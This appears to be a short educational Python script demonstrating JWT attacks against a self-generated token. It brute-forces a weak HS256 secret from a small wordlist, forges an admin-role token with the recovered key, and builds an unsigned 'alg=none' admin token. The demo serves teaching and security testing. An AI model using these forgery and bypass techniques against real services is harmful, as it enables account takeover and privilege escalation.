#!/usr/bin/env python3
"""
jwt_attack_demo.py — Demonstration of JWT vulnerabilities
Author: Dayasri
"""

import jwt   # PyJWT library
import base64
import json
import time

# Demo secret and wordlist
SECRET = "password123"
WORDLIST = ["123456", "password", "password123", "admin"]


def generate_vulnerable_jwt():
    """Generate a JWT signed with a weak secret."""
    payload = {"user": "victim", "role": "user", "iat": int(time.time())}
    token = jwt.encode(payload, SECRET, algorithm="HS256")

    # In PyJWT >= 2.0, jwt.encode() returns a string, not bytes
    if isinstance(token, bytes):
        token = token.decode()

    print("[+] Vulnerable token:", token)
    return token


def brute_force_jwt(token):
    """Try to brute-force the secret key from a given token."""
    for word in WORDLIST:
        try:
            jwt.decode(token, word, algorithms=["HS256"])
            print("[+] Secret found by brute-force:", word)
            return word
        except Exception:
            continue
    print("[-] Secret not found")
    return None


def forge_admin_token(secret):
    """Forge a malicious admin token once the secret is known."""
    payload = {"user": "attacker", "role": "admin", "iat": int(time.time())}
    token = jwt.encode(payload, secret, algorithm="HS256")

    if isinstance(token, bytes):
        token = token.decode()

    print("[+] Forged admin token:", token)


def none_alg_attack():
    """Demonstrate an alg=none unsigned token attack."""
    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "attacker", "role": "admin"}

    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

    token = f"{header_b64}.{payload_b64}."
    print("[+] Unsigned alg=none token:", token)


if __name__ == "__main__":
    token = generate_vulnerable_jwt()
    secret = brute_force_jwt(token)
    if secret:
        forge_admin_token(secret)
    none_alg_attack()

